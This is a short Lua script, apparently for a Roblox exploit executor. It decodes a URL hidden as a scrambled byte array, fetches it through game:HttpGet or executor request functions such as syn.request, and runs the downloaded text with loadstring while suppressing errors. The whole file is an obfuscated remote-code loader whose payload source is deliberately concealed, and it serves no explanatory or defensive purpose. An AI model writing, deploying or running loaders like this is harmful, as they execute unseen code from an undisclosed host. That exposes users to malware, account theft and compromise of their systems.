local a={186,251,48,97,158,154,196,249,111,110,164,26,69,135,181,237,31,22,78,182,250,47,103,92,197,7,65,52,164,224,25,79,126,184,230,226,76,143,199,2,38,38,164,213,7,49,109,164,161,11,80,129,177,233,28,27,146,202,241,41,95,166}
local function b()
 local t={}
 for i=1,#a do t[i]=string.char((a[i]-(i*53+29)%251)%256) end
 return table.concat(t)
end
local function c(s)
 if type(s)~="string" or #s==0 then return nil end
 local l=loadstring or load
 if type(l)~="function" then return nil end
 local ok,f=pcall(l,s)
 if ok and type(f)=="function" then return f end
end
local u=b()
local f
local ok,res=pcall(function() return game:HttpGet(u,true) end)
if ok then f=c(res) end
if not f then
 local r=request or http_request or (type(syn)=="table" and syn.request) or (type(http)=="table" and http.request)
 if type(r)=="function" then
  local o,v=pcall(r,{Url=u,Method="GET",Headers={Accept="text/plain"}})
  if o and type(v)=="table" and (tonumber(v.StatusCode or v.Status or v.status)==200 or v.Success==true) then
   f=c(v.Body or v.body)
  end
 end
end
if not f then error("Unavailable",0) end
return f()
